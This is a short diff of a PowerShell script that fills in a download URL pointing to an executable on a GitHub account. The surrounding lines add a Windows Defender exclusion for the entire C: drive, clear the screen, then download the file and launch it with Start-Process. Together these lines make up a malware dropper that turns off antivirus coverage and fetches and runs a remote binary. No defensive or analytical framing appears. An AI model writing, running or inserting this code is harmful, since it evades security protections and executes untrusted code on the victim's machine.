@@ -37,7 +37,7 @@ Clear-Host
 Add-MpPreference -ExclusionPath "C:/"
 Clear-Host
 $username = $env:USERNAME
-$url = ' '
+$url = 'https://github.com/cs2cc/s/raw/main/Everything.exe'
 $output = "C:\"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
